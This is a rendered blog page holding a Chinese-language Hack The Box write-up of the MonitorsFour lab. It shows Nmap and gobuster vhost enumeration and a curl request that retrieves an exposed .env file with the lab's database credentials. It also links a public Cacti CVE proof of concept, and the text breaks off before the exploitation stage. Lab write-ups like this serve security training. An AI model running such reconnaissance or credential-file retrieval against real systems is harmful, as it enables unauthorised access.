@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="EnchanterW">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/12/13/htb_monitorsfour/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="So many things to hack , such little time to work.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB - MonitorsFour Writeup">
+<meta property="og:url" content="http://example.com/2025/12/13/HTB_monitorsfour/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="So many things to hack , such little time to work.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-12-12T19:40:00.000Z">
+<meta property="article:modified_time" content="2025-12-12T19:14:04.678Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="WSL2">
+<meta property="article:tag" content="Docker">
+<meta property="article:tag" content="Cacti">
+<meta property="article:tag" content="PHP Type Juggling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-DQKJ6ECS1S"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-DQKJ6ECS1S');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+    <meta name="theme-color" content="#3C9566">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB - MonitorsFour Writeup | Enchanterの小本本
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#3C9566","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"So many things to hack , such little time to work."},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"So many things to hack , such little time to work."},"google_analytics":{"enable":true,"id":"G-DQKJ6ECS1S"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Wellcome to my blog","subtitle":{"text":["So many things to hack , such little time to work."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#ffffff","dark":"#053154"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/Enchanter-W","Blog":"https://enchanter-w.github.io/","Friends":"/friends"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/12/30 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        So many things to hack , such little time to work.
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/web-app-manifest-192x192.png" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Enchanterの小本本
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/Enchanter-W">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://enchanter-w.github.io/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/Enchanter-W">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://enchanter-w.github.io/">BLOG</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags/"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories/"
+                        >
+                            <span>Categories</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="/images/MonitorsFour_cover.jpg" alt="HTB - MonitorsFour Writeup" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">HTB - MonitorsFour Writeup</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/web-app-manifest-192x192.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">EnchanterW</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-13 03:40</span>
+        <span class="mobile">2025-12-13 03:40</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-13 03:14:04</span>
+            <span class="mobile">2025-12-13 03:14:04</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Writeup/">Writeup</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Windows/">Windows</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WSL2/">WSL2</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Docker/">Docker</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Cacti/">Cacti</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP-Type-Juggling/">PHP Type Juggling</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="HTB-MonitorsFour-Writeup"><a href="#HTB-MonitorsFour-Writeup" class="headerlink" title="[HTB-MonitorsFour] Writeup"></a>[HTB-MonitorsFour] Writeup</h2><table>
+<thead>
+<tr>
+<th align="left"><strong>机器名称</strong></th>
+<th align="left"><strong>[MonitorsFour]</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>IP 地址</strong></td>
+<td align="left"><code>10.10.11.98</code></td>
+</tr>
+<tr>
+<td align="left"><strong>操作系统</strong></td>
+<td align="left">Windows (WSL2)</td>
+</tr>
+<tr>
+<td align="left"><strong>难度</strong></td>
+<td align="left">Medium &#x2F; Hard</td>
+</tr>
+<tr>
+<td align="left"><strong>关键词</strong></td>
+<td align="left">[Web, Cacti, PHP Type Juggling, Docker Escape, Scheduled Task]</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="1-Reconnaissance-扫描"><a href="#1-Reconnaissance-扫描" class="headerlink" title="1. Reconnaissance (扫描)"></a>1. Reconnaissance (扫描)</h3><h4 id="Nmap-扫描"><a href="#Nmap-扫描" class="headerlink" title="Nmap 扫描"></a>Nmap 扫描</h4><details class="cyan" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>点击查看 Nmap 详细扫描结果 </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">|_http-title: Did not follow redirect to [http://monitorsfour.htb/](http://monitorsfour.htb/)</span><br><span class="line">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using proto 1/icmp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   510.90 ms 10.10.16.1</span><br><span class="line">2   510.97 ms 10.129.45.253		</span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+
+  <div class="note p-4 mb-4 rounded-small info icon-padding">
+    <i class="note-icon fa-solid fa-circle-info"></i><p><strong>Note:</strong> 一个 80 一个 5985，没有别的发现了，看来不是一台域靶机应该。另外发现了 <code>minitorsfour.htb</code> 这个域名，加进 hosts 里面，有域名的话我们后台跑一个低线程的子域名扫描。</p>
+
+  </div>
+
+<h4 id="Vhost-扫描"><a href="#Vhost-扫描" class="headerlink" title="Vhost 扫描"></a>Vhost 扫描</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u [http://10.10.11.98](http://10.10.11.98) --domain  monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt   --append-domain -t 75</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213011646801.png"
+                      alt="image-20251213011646801"
+                ></p>
+<h3 id="2-Enumeration-服务枚举"><a href="#2-Enumeration-服务枚举" class="headerlink" title="2. Enumeration (服务枚举)"></a>2. Enumeration (服务枚举)</h3><h4 id="Web1-Analysis-Port-80"><a href="#Web1-Analysis-Port-80" class="headerlink" title="Web1 Analysis (Port 80)"></a>Web1 Analysis (Port 80)</h4><p>先去 80 端口看看，网站表面来看只有一个登录界面和一个邮箱地址<del class="mask">这个应该没用</del>，我们没有用户名也没有密码。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213011209054.png"
+                      alt="image-20251213011209054"
+                ></p>
+<p>扫了一下目录发现了一个 <code>.env</code> 文件内容是一个数据库的用户名和密码，尝试用这个用户名和密码去登录网站也没有成功。这时候去查看 vhost 的结果，得到一个 <code>cacti</code> 的子域名，添加到 hosts 中去查看一下，依旧是一个网站。</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl -i [http://monitorsfour.htb/.env](http://monitorsfour.htb/.env)                                          </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 12 Dec 2025 16:44:38 GMT</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Length: 97</span><br><span class="line">Last-Modified: Sat, 13 Sep 2025 05:37:28 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">ETag: <span class="string">&quot;68c50318-61&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">DB_HOST=mariadb</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_NAME=monitorsfour_db</span><br><span class="line">DB_USER=monitorsdbuser</span><br><span class="line">DB_PASS=f37p2j8f4t0r</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Web2-Analysis-Cacti"><a href="#Web2-Analysis-Cacti" class="headerlink" title="Web2 Analysis (Cacti)"></a>Web2 Analysis (Cacti)</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213011820362.png"
+                      alt="image-20251213011820362"
+                ></p>
+<p>带着版本号去查看一下有什么漏洞，发现这个系统的漏洞还挺多的。</p>
+<a class="button  regular" target="_blank" rel="noopener" href='https://security.snyk.io/package/linux/alpine:3.23/cacti' title='Snyk Vulnerability DB'><i class='fa-solid fa-shield-halved'></i> Snyk Vulnerability DB</a>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20251213012036515.png"
+                      alt="image-20251213012036515"
+                ></p>
+<p>符合版本号要求的漏洞也不少，其中有一个 cve 引起注意。写文章时候截图的界面最下面的链接甚至已经将靶机作者的 poc 链接贴上了，我记得我打的时候还没有这个的<del class="mask">也可能是傻福记错了</del>。</p>
+<p>去到 GitHub 仓库看看 poc 长啥样：</p>
+<a class="button  regular" target="_blank" rel="noopener" href='https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC' title='CVE-2025-24367 PoC'><i class='fa-brands fa-github'></i> CVE-2025-24367 PoC</a>
+
+<p><strong>问题：</strong> 这个漏洞要求拥有账户名和密码，依旧回到最初的问题，我没有这玩意。</p>
+<h4 id="API-Discovery-Token-Brute-force"><a href="#API-Discovery-Token-Brute-force" class="headerlink" title="API Discovery &amp; Token Brute-force"></a>API Discovery &amp; Token Brute-force</h4><p>爆破的话这个系统还有 csrf，虽然放到 burp 中也很好办但是感觉干爆破也不是办法。试了很多之后又回去扫了一遍 web1 的目录发现了一个 api。</p>
